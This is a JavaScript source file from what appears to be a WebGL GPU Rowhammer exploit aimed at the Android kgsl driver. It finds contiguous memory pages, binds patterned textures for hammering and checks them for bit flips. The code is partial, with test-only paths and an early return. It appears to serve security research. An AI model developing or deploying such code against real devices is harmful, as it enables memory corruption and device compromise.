/**
* Entry point of the exploit
* TODO: optimize the python server to ignore previous kgsl entries
*/
async function glitch() {
    // create gl context
    initGL();

    const allocationPages = 256 * 128
    // const allocationPages = 8
    let allocator = new Allocator(allocationPages)
    await allocator._init(0)

    contPages = allocator.SearchContPages()
    console.log(`++ ${contPages.length} continuous pages found`)

    allocator.clean()
    return 
    initFramebuffer();
    
    // enable shaders too be used
    shader = new Shader('vertex-shader', 'fragment-shader');
    shader.use();

    // create debug requirements
    initDebug();
    prepareHammerTime();
    gl.drawArrays(gl.TRIANGLES, 0, 6);
    viewFramebuffer();
}

function prepareHammerTime() {
    // TODO: this is only for testing purposes
    const textures = [];
    for(let i=0; i<9; i++) {
        const t = createTexture2DRGBA(createUint8Array(KB4, 20+i), PAGE_TEXTURE_W, PAGE_TEXTURE_H);
        textures.push(t);
    }

    fillTexture(textures[0], 0x00);
    fillTexture(textures[1], 0xFF);
    fillTexture(textures[2], 0x0F);
    
    shader.bindTexture(textures[8], 8, 'H', 8);
    shader.bindTexture(textures[5], 5, 'H', 5);
    shader.bindTexture(textures[0], 0, 'H', 0);
    shader.bindTexture(textures[4], 4, 'H', 4);
    shader.bindTexture(textures[1], 1, 'H', 1);
    shader.bindTexture(textures[2], 2, 'H', 2);
    shader.bindTexture(textures[6], 6, 'H', 6);
    shader.bindTexture(textures[3], 3, 'H', 3);
    shader.bindTexture(textures[7], 7, 'H', 7);
    
    checkForFlip(textures[2]);
    checkForFlip(textures[1]);
    checkForFlip(textures[8]);
}

async function testAllocator() {
    const allocationPages = 4
    let safeAllocator = new Allocator(allocationPages)
    await safeAllocator._init(1)

    let allocator = new Allocator(allocationPages)
    await allocator._init(0)

    console.log(allocator.newKGSL)
    console.log(allocator.newKGSLSafe)
    allocator.clean()
    safeAllocator.clean()
}
